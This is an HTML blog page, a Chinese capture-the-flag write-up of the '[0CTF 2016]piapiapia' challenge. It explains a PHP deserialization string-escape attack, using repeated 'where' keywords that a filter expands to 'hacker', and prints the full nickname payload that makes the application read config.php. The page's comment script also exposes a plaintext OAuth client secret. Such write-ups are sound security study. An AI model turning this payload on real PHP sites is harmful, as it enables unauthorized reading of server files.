@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言：&amp;emsp; 这题收获还是蛮大的，从中再次了解了数组对strlen函数和preg_match() 函数的影响。也清晰了什么时候可以用上传文件漏洞。也第一次遇到了反序列化的闭合操作。还了解到了Seay源代码审计软件带来的便利。 0X01 解题思路 打开题目链接，我们可以看到一个登入页面。sql注入无果。 使用御剑或者其它扫描工具可以扫到&#x2F;register.php（注册页面），当然我是看别人wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[0CTF 2016]piapiapia">
+<meta property="og:url" content="https://mayi077.github.io/2020/02/01/0CTF-2016-piapiapia/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言：&amp;emsp; 这题收获还是蛮大的，从中再次了解了数组对strlen函数和preg_match() 函数的影响。也清晰了什么时候可以用上传文件漏洞。也第一次遇到了反序列化的闭合操作。还了解到了Seay源代码审计软件带来的便利。 0X01 解题思路 打开题目链接，我们可以看到一个登入页面。sql注入无果。 使用御剑或者其它扫描工具可以扫到&#x2F;register.php（注册页面），当然我是看别人wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e351f7d2fb38b8c3c36ca6f.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e3523752fb38b8c3c37212c.jpg">
+<meta property="article:published_time" content="2020-02-01T07:17:48.000Z">
+<meta property="article:modified_time" content="2020-02-15T08:59:18.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e351f7d2fb38b8c3c36ca6f.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/02/01/0CTF-2016-piapiapia/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>[0CTF 2016]piapiapia | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/02/01/0CTF-2016-piapiapia/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [0CTF 2016]piapiapia
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-01 15:17:48" itemprop="dateCreated datePublished" datetime="2020-02-01T15:17:48+08:00">2020-02-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-15 16:59:18" itemprop="dateModified" datetime="2020-02-15T16:59:18+08:00">2020-02-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF复现</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>&emsp; 这题收获还是蛮大的，从中再次了解了数组对strlen函数和preg_match() 函数的影响。也清晰了什么时候可以用上传文件漏洞。也第一次遇到了反序列化的闭合操作。还了解到了Seay源代码审计软件带来的便利。</p>
+<h3 id="0X01-解题思路"><a href="#0X01-解题思路" class="headerlink" title="0X01 解题思路"></a>0X01 解题思路</h3><ol>
+<li>打开题目链接，我们可以看到一个登入页面。sql注入无果。</li>
+<li>使用御剑或者其它扫描工具可以扫到/register.php（注册页面），当然我是看别人wp知道的。</li>
+<li>进入/register.php后注册一个账号，然后去登入。登入成功后，看到一个上传个人信息的页面，可以上传照片。（经过测试没有文件上传漏洞）</li>
+<li>根据大佬的wp可以知道有<a href="http://www.zip文件（buu有限制所以我就没扫了），接下来就是代码审计了。" target="_blank" rel="noopener">www.zip文件（buu有限制所以我就没扫了），接下来就是代码审计了。</a></li>
+<li>我们拿到的源码里的文件不是很多，class.php里有一些重要的函数，update.php和profile.php我们比较熟悉了，一个上传文件，一个获取文件。最重要的是config.php，我们看到flag在里面。也就是说我们读到config.php就可以得到flag。</li>
+<li>这里我使用了Seay来进行代码审计，发现了突破口就是profile.php文件下的file_get_contents函数。<br><img data-src="https://pic.downk.cc/item/5e351f7d2fb38b8c3c36ca6f.jpg" alt=""></li>
+<li>上面还有个反序列化unserialize，感觉有戏，如果$profile[‘photo’]是config.php就可以读取到了，可以对photo进行操作的地方在update.php，有phone、email、nickname和photo这几个。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$profile &#x3D; a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br><span class="line">print_r(unserialize($profile));</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] &#x3D;&gt; 12345678901</span><br><span class="line">    [email] &#x3D;&gt; ss@q.com</span><br><span class="line">    [nickname] &#x3D;&gt; sea_sand</span><br><span class="line">    [photo] &#x3D;&gt; config.php</span><br><span class="line">)</span><br><span class="line">&#x2F;&#x2F;可以看到反序列化之后，最后面upload这一部分就没了（也可以理解为闭合了），下面就是想办法把config.php塞进去了。</span><br></pre></td></tr></table></figure></li>
+<li>从数组顺序上看是和上面数组的顺序一样的，可以抓个包看下post顺序，那么最有可能的就是从nickname下手了。那么分析一下nickname这个变量。在设置了$profile之后，用update_profile()函数进行处理,ra然后又调用了filter函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">	$username &#x3D; parent::filter($username);</span><br><span class="line">	$new_profile &#x3D; parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">	return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line">------------------------------</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">	$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">	$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">	$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">	$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">	$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">	return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+&emsp;有两个正则过滤，带上输入nickname时候有一个正则，总共三个过滤的地方，首先要绕过第一个输入时候的正则：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">			die(&#39;Invalid nickname&#39;);</span><br><span class="line">数组即可绕过：</span><br><span class="line">nickname[]&#x3D;</span><br><span class="line"></span><br><span class="line">那么$profile就是这样了：</span><br><span class="line">$profile &#x3D; a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;xxx&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>
+&emsp;后面的正则要怎么利用呢，可以看到如果我们输入的有where，会替换成hacker，这样的话长度就变了，序列化后的每个变量都是有长度的，那么反序列化会怎么处理呢？我们应该怎么构造呢？</li>
+<li>数组绕过了第一个正则过滤之后，如果nickname最后面塞上”;}s:5:“photo”;s:10:“config.php”;}，一共是34个字符，如果利用正则替换34个where，不就可以把这34个给挤出去，后面的upload因为序列化串被我们闭合了也就没用了(where会被替换成hacker可以帮我们挤出一位)：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nickname[]&#x3D;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">$profile &#x3D; a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>
+&emsp;在where被正则匹配换成hacker之后，正好满足长度，然后后面的”};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。  </li>
+<li>接着我们上传图片及信息，用brup抓包更改nickname为我们想要的值即可。<br><img data-src="https://pic.downk.cc/item/5e3523752fb38b8c3c37212c.jpg" alt=""></li>
+<li>然后进入到profile中查看图片信息，把base64码解码即可得到我们的flag，大功告成！！！</li>
+</ol>
+<p>参考链接：<a href="https://blog.csdn.net/zz_Caleb/article/details/96777110" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/96777110</a> </p>
+<h3 id="0X02-补充知识"><a href="#0X02-补充知识" class="headerlink" title="0X02 补充知识"></a>0X02 补充知识</h3><h5 id="一、文件漏洞攻击成功的条件"><a href="#一、文件漏洞攻击成功的条件" class="headerlink" title="一、文件漏洞攻击成功的条件"></a>一、文件漏洞攻击成功的条件</h5><p>一个“可疑”文件成功上传到后台后并不代表攻击就成功了。还必须满足一定的条件才能才能对后台造成攻击:</p>
+<ul>
+<li>首先上传的文件能够被Web容器解释执行(比如php被Apache容器执行),所以文件上传后所在的目录要是Web容器所覆盖到的路径;</li>
+<li>其次，用户能够从Web上访问这个文件，如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。</li>
+</ul>
+<h5 id="二、改变序列化字符串长度导致反序列化漏洞"><a href="#二、改变序列化字符串长度导致反序列化漏洞" class="headerlink" title="二、改变序列化字符串长度导致反序列化漏洞"></a>二、改变序列化字符串长度导致反序列化漏洞</h5><ul>
+<li>unserialize()会忽略能够正常序列化的字符串后面的字符串。比如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13587819970&quot;;s:5:&quot;email&quot;;s:32:&quot;aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa&quot;;s:8:&quot;nickname&quot;;s:10:&quot;12345hacke&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload&#x2F;f47454d1d3644127f42070181a8b9afc&quot;;&#125;</span><br></pre></td></tr></table></figure>
+反序列化会正常解析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;13587819970&quot;;s:5:&quot;email&quot;;s:32:&quot;aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa&quot;;s:8:&quot;nickname&quot;;s:10:&quot;12345hacke&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+而忽略了后面的<code>s:39:&quot;upload/f47454d1d3644127f42070181a8b9afc&quot;;}</code>从而导致读取config.php</li>
+<li>可以利用这个规则构造字符串来闭合，如本题中filter()将where替换成hacker，就可以将这个成员的最后一个字符挤出去，重复34次就可以挤出34个字符，正好闭合改序列化字符串</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/02/01/0CTF-2016-piapiapia/" title="[0CTF 2016]piapiapia">https://mayi077.github.io/2020/02/01/0CTF-2016-piapiapia/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/buuctf/" rel="tag"><i class="fa fa-tag"></i>buuctf</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i>代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/01/31/RoarCTF-2019-Easy-Java/" rel="prev" title="[RoarCTF 2019]Easy Java">
+      <i class="fa fa-chevron-left"></i> [RoarCTF 2019]Easy Java
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/" rel="next" title="[极客大挑战 2019]PHP">
+      [极客大挑战 2019]PHP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-解题思路"><span class="nav-number"></span> <span class="nav-text">0X01 解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-补充知识"><span class="nav-number"></span> <span class="nav-text">0X02 补充知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一、文件漏洞攻击成功的条件"><span class="nav-number">0.1.</span> <span class="nav-text">一、文件漏洞攻击成功的条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二、改变序列化字符串长度导致反序列化漏洞"><span class="nav-number">0.2.</span> <span class="nav-text">二、改变序列化字符串长度导致反序列化漏洞</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'd6e0b82d68233f365f7f7de614ceb834',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
